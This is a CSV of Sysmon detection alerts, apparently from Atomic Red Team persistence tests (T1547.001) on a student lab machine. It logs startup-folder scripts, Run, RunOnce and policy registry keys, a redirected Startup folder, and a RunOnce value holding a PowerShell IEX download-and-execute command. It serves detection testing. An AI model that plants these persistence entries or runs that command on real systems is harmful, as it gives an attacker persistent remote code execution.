"Timestamp","RuleTitle","Level","Computer","Channel","EventID","MitreTactics","MitreTags","OtherTags","RecordID","Details","ExtraFieldInfo","RuleFile","RuleID","EvtxFile"
"2025-12-26 11:19:16.562 +01:00","File Created","info","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",173630,"Path: C:\Users\student\AppData\Local\Temp\__PSScriptPolicyTest_bbd020fu.vyd.ps1 ¦ Proc: C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 6056 ¦ PGUID: E9F06A57-6124-694E-9601-000000002400","CreationUtcTime: 2025-12-26 10:19:16.557 ¦ RuleName: - ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:19:16.557","Sysmon_11_Info_FileCreated.yml","8a76bcd8-dec2-4c8a-995d-a4600aad8fe2","C:\Tools\Logs\art_1547_001.evtx"
"2025-12-26 11:19:17.213 +01:00","File Created","info","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",173634,"Path: C:\Users\student\AppData\Local\Temp\__PSScriptPolicyTest_fete1t0y.sld.ps1 ¦ Proc: C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 1448 ¦ PGUID: E9F06A57-6125-694E-9801-000000002400","CreationUtcTime: 2025-12-26 10:19:17.209 ¦ RuleName: - ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:19:17.211","Sysmon_11_Info_FileCreated.yml","8a76bcd8-dec2-4c8a-995d-a4600aad8fe2","C:\Tools\Logs\art_1547_001.evtx"
"2025-12-26 11:19:18.573 +01:00","File Created","info","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",173642,"Path: C:\Users\student\AppData\Local\Temp\__PSScriptPolicyTest_ng2cobzu.2zq.ps1 ¦ Proc: C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 1456 ¦ PGUID: E9F06A57-6126-694E-9E01-000000002400","CreationUtcTime: 2025-12-26 10:19:18.567 ¦ RuleName: - ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:19:18.567","Sysmon_11_Info_FileCreated.yml","8a76bcd8-dec2-4c8a-995d-a4600aad8fe2","C:\Tools\Logs\art_1547_001.evtx"
"2025-12-26 11:18:54.428 +01:00","File Created (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",173570,"Rule: T1023 ¦ Path: C:\Users\student\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\vbsstartup.vbs ¦ Proc: C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7868 ¦ PGUID: E9F06A57-610D-694E-7201-000000002400","CreationUtcTime: 2025-12-26 10:18:54.425 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:18:54.425","Sysmon_11_Med_FileCreated_RuleAlert.yml","c5e6b545-73a4-4650-ae97-67c239005382","C:\Tools\Logs\art_1547_001.evtx"
"2025-12-26 11:18:54.432 +01:00","File Created (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",173572,"Rule: T1023 ¦ Path: C:\Users\student\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\vbsstartup.vbs:Zone.Identifier ¦ Proc: C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7868 ¦ PGUID: E9F06A57-610D-694E-7201-000000002400","CreationUtcTime: 2025-12-26 10:18:54.425 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:18:54.427","Sysmon_11_Med_FileCreated_RuleAlert.yml","c5e6b545-73a4-4650-ae97-67c239005382","C:\Tools\Logs\art_1547_001.evtx"
"2025-12-26 11:18:54.434 +01:00","File Created (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",173574,"Rule: T1023 ¦ Path: C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\vbsstartup.vbs ¦ Proc: C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7868 ¦ PGUID: E9F06A57-610D-694E-7201-000000002400","CreationUtcTime: 2025-12-26 10:18:54.433 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:18:54.433","Sysmon_11_Med_FileCreated_RuleAlert.yml","c5e6b545-73a4-4650-ae97-67c239005382","C:\Tools\Logs\art_1547_001.evtx"
"2025-12-26 11:18:54.436 +01:00","File Created (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",173576,"Rule: T1023 ¦ Path: C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\vbsstartup.vbs:Zone.Identifier ¦ Proc: C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7868 ¦ PGUID: E9F06A57-610D-694E-7201-000000002400","CreationUtcTime: 2025-12-26 10:18:54.433 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:18:54.435","Sysmon_11_Med_FileCreated_RuleAlert.yml","c5e6b545-73a4-4650-ae97-67c239005382","C:\Tools\Logs\art_1547_001.evtx"
"2025-12-26 11:18:55.803 +01:00","File Created (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",173582,"Rule: T1023 ¦ Path: C:\Users\student\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\jsestartup.jse ¦ Proc: C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 5496 ¦ PGUID: E9F06A57-610F-694E-7601-000000002400","CreationUtcTime: 2025-12-26 10:18:55.802 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:18:55.802","Sysmon_11_Med_FileCreated_RuleAlert.yml","c5e6b545-73a4-4650-ae97-67c239005382","C:\Tools\Logs\art_1547_001.evtx"
"2025-12-26 11:18:55.806 +01:00","File Created (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",173584,"Rule: T1023 ¦ Path: C:\Users\student\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\jsestartup.jse:Zone.Identifier ¦ Proc: C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 5496 ¦ PGUID: E9F06A57-610F-694E-7601-000000002400","CreationUtcTime: 2025-12-26 10:18:55.802 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:18:55.803","Sysmon_11_Med_FileCreated_RuleAlert.yml","c5e6b545-73a4-4650-ae97-67c239005382","C:\Tools\Logs\art_1547_001.evtx"
"2025-12-26 11:18:55.812 +01:00","File Created (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",173586,"Rule: T1023 ¦ Path: C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\jsestartup.jse ¦ Proc: C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 5496 ¦ PGUID: E9F06A57-610F-694E-7601-000000002400","CreationUtcTime: 2025-12-26 10:18:55.809 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:18:55.809","Sysmon_11_Med_FileCreated_RuleAlert.yml","c5e6b545-73a4-4650-ae97-67c239005382","C:\Tools\Logs\art_1547_001.evtx"
"2025-12-26 11:18:55.812 +01:00","File Created (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",173588,"Rule: T1023 ¦ Path: C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\jsestartup.jse:Zone.Identifier ¦ Proc: C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 5496 ¦ PGUID: E9F06A57-610F-694E-7601-000000002400","CreationUtcTime: 2025-12-26 10:18:55.809 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:18:55.811","Sysmon_11_Med_FileCreated_RuleAlert.yml","c5e6b545-73a4-4650-ae97-67c239005382","C:\Tools\Logs\art_1547_001.evtx"
"2025-12-26 11:18:57.601 +01:00","File Created (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",173595,"Rule: T1023 ¦ Path: C:\Users\student\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\batstartup.bat ¦ Proc: C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 8056 ¦ PGUID: E9F06A57-6111-694E-7D01-000000002400","CreationUtcTime: 2025-12-26 10:18:57.599 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:18:57.599","Sysmon_11_Med_FileCreated_RuleAlert.yml","c5e6b545-73a4-4650-ae97-67c239005382","C:\Tools\Logs\art_1547_001.evtx"
"2025-12-26 11:18:57.603 +01:00","File Created (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",173597,"Rule: T1023 ¦ Path: C:\Users\student\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\batstartup.bat:Zone.Identifier ¦ Proc: C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 8056 ¦ PGUID: E9F06A57-6111-694E-7D01-000000002400","CreationUtcTime: 2025-12-26 10:18:57.599 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:18:57.601","Sysmon_11_Med_FileCreated_RuleAlert.yml","c5e6b545-73a4-4650-ae97-67c239005382","C:\Tools\Logs\art_1547_001.evtx"
"2025-12-26 11:18:57.610 +01:00","File Created (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",173599,"Rule: T1023 ¦ Path: C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\batstartup.bat ¦ Proc: C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 8056 ¦ PGUID: E9F06A57-6111-694E-7D01-000000002400","CreationUtcTime: 2025-12-26 10:18:57.605 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:18:57.607","Sysmon_11_Med_FileCreated_RuleAlert.yml","c5e6b545-73a4-4650-ae97-67c239005382","C:\Tools\Logs\art_1547_001.evtx"
"2025-12-26 11:18:57.621 +01:00","File Created (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",173601,"Rule: T1023 ¦ Path: C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\batstartup.bat:Zone.Identifier ¦ Proc: C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 8056 ¦ PGUID: E9F06A57-6111-694E-7D01-000000002400","CreationUtcTime: 2025-12-26 10:18:57.605 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:18:57.613","Sysmon_11_Med_FileCreated_RuleAlert.yml","c5e6b545-73a4-4650-ae97-67c239005382","C:\Tools\Logs\art_1547_001.evtx"
"2025-12-26 11:19:06.507 +01:00","File Created (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",173607,"Rule: T1023 ¦ Path: C:\Users\student\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\calc_exe.lnk ¦ Proc: C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 5588 ¦ PGUID: E9F06A57-6119-694E-8301-000000002400","CreationUtcTime: 2025-12-26 10:19:06.506 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:19:06.506","Sysmon_11_Med_FileCreated_RuleAlert.yml","c5e6b545-73a4-4650-ae97-67c239005382","C:\Tools\Logs\art_1547_001.evtx"
"2025-12-26 11:19:10.670 +01:00","File Created (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",173618,"Rule: EXE ¦ Path: C:\Users\student\AppData\Local\Temp\atomictest\calc.exe ¦ Proc: C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 8884 ¦ PGUID: E9F06A57-611C-694E-8E01-000000002400","CreationUtcTime: 2025-12-26 10:19:10.667 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:19:10.667","Sysmon_11_Med_FileCreated_RuleAlert.yml","c5e6b545-73a4-4650-ae97-67c239005382","C:\Tools\Logs\art_1547_001.evtx"
"2025-12-26 11:19:11.848 +01:00","File Created (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",173621,"Rule: EXE ¦ Path: C:\Users\student\AppData\Local\Temp\atomictest\calc.exe ¦ Proc: C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 9204 ¦ PGUID: E9F06A57-611F-694E-9001-000000002400","CreationUtcTime: 2025-12-26 10:19:10.667 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:19:11.843","Sysmon_11_Med_FileCreated_RuleAlert.yml","c5e6b545-73a4-4650-ae97-67c239005382","C:\Tools\Logs\art_1547_001.evtx"
"2025-12-26 11:18:45.400 +01:00","Reg Key Value Set (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",13,"","","sysmon",173560,"Rule: T1060,RunKey ¦ EventType: SetValue ¦ TgtObj: HKU\S-1-5-21-684153438-199924312-2028511378-1003\Software\Microsoft\Windows\CurrentVersion\Run\Atomic Red Team ¦ C:\Path\AtomicRedTeam.exe ¦ Proc: C:\WINDOWS\system32\reg.exe ¦ PID: 2516 ¦ PGUID: E9F06A57-6105-694E-6B01-000000002400","User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:18:45.398","Sysmon_13_RegKeyValueSet_RuleAlert.yml","78431930-a5c6-46ae-b02c-fcdc2a7325c2","C:\Tools\Logs\art_1547_001.evtx"
"2025-12-26 11:18:49.429 +01:00","Reg Key Value Set (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",13,"","","sysmon",173563,"Rule: T1060,RunKey ¦ EventType: SetValue ¦ TgtObj: HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnceEx\0001\Depend\1 ¦ C:\Path\AtomicRedTeam.dll ¦ Proc: C:\WINDOWS\system32\reg.exe ¦ PID: 1804 ¦ PGUID: E9F06A57-6109-694E-6E01-000000002400","User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:18:49.427","Sysmon_13_RegKeyValueSet_RuleAlert.yml","78431930-a5c6-46ae-b02c-fcdc2a7325c2","C:\Tools\Logs\art_1547_001.evtx"
"2025-12-26 11:18:53.681 +01:00","Reg Key Value Set (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",13,"","","sysmon",173567,"Rule: T1060,RunKey ¦ EventType: SetValue ¦ TgtObj: HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce\NextRun ¦ powershell.exe ""IEX (New-Object Net.WebClient).DownloadString(`""https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1547.001/src/Discovery.bat`"")"" ¦ Proc: C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 6384 ¦ PGUID: E9F06A57-6109-694E-6F01-000000002400","User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:18:53.680","Sysmon_13_RegKeyValueSet_RuleAlert.yml","78431930-a5c6-46ae-b02c-fcdc2a7325c2","C:\Tools\Logs\art_1547_001.evtx"
"2025-12-26 11:19:06.999 +01:00","Reg Key Value Set (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",13,"","","sysmon",173610,"Rule: T1042 ¦ EventType: SetValue ¦ TgtObj: HKCR\CLSID\{645FF040-5081-101B-9F08-00AA002F954E}\shell\open\command\(Default) ¦ calc.exe ¦ Proc: C:\WINDOWS\system32\reg.exe ¦ PID: 3644 ¦ PGUID: E9F06A57-611A-694E-8801-000000002400","User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:19:06.997","Sysmon_13_RegKeyValueSet_RuleAlert.yml","78431930-a5c6-46ae-b02c-fcdc2a7325c2","C:\Tools\Logs\art_1547_001.evtx"
"2025-12-26 11:19:07.893 +01:00","Reg Key Value Set (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",13,"","","sysmon",173615,"Rule: T1060,RunKey ¦ EventType: SetValue ¦ TgtObj: HKU\S-1-5-21-684153438-199924312-2028511378-1003\Software\Microsoft\Windows\CurrentVersion\Run\socks5_powershell ¦ powershell.exe -windowstyle hidden -ExecutionPolicy Bypass -File ¦ Proc: C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 8680 ¦ PGUID: E9F06A57-611B-694E-8C01-000000002400","User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:19:07.886","Sysmon_13_RegKeyValueSet_RuleAlert.yml","78431930-a5c6-46ae-b02c-fcdc2a7325c2","C:\Tools\Logs\art_1547_001.evtx"
"2025-12-26 11:19:11.854 +01:00","Reg Key Value Set (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",13,"","","sysmon",173622,"Rule: T1112,ChangeStartupFolderPath ¦ EventType: SetValue ¦ TgtObj: HKU\S-1-5-21-684153438-199924312-2028511378-1003\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders\Startup ¦ C:\Users\student\AppData\Local\Temp\atomictest\ ¦ Proc: C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 9204 ¦ PGUID: E9F06A57-611F-694E-9001-000000002400","User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:19:11.849","Sysmon_13_RegKeyValueSet_RuleAlert.yml","78431930-a5c6-46ae-b02c-fcdc2a7325c2","C:\Tools\Logs\art_1547_001.evtx"
"2025-12-26 11:19:13.404 +01:00","Reg Key Value Set (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",13,"","","sysmon",173625,"Rule: T1060,RunPolicy ¦ EventType: SetValue ¦ TgtObj: HKU\S-1-5-21-684153438-199924312-2028511378-1003\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run\atomictest ¦ C:\Windows\System32\calc.exe ¦ Proc: C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 8004 ¦ PGUID: E9F06A57-6120-694E-9201-000000002400","User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:19:13.404","Sysmon_13_RegKeyValueSet_RuleAlert.yml","78431930-a5c6-46ae-b02c-fcdc2a7325c2","C:\Tools\Logs\art_1547_001.evtx"
"2025-12-26 11:19:16.176 +01:00","Reg Key Value Set (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",13,"","","sysmon",173628,"Rule: T1060,RunPolicy ¦ EventType: SetValue ¦ TgtObj: HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run\atomictest ¦ C:\Windows\System32\calc.exe ¦ Proc: C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 2424 ¦ PGUID: E9F06A57-6121-694E-9401-000000002400","User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:19:16.175","Sysmon_13_RegKeyValueSet_RuleAlert.yml","78431930-a5c6-46ae-b02c-fcdc2a7325c2","C:\Tools\Logs\art_1547_001.evtx"
"2025-12-26 11:19:17.548 +01:00","Reg Key Value Set (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",13,"","","sysmon",173635,"Rule: T1060 ¦ EventType: SetValue ¦ TgtObj: HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\Shell-backup ¦ explorer.exe ¦ Proc: C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 1448 ¦ PGUID: E9F06A57-6125-694E-9801-000000002400","User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:19:17.545","Sysmon_13_RegKeyValueSet_RuleAlert.yml","78431930-a5c6-46ae-b02c-fcdc2a7325c2","C:\Tools\Logs\art_1547_001.evtx"
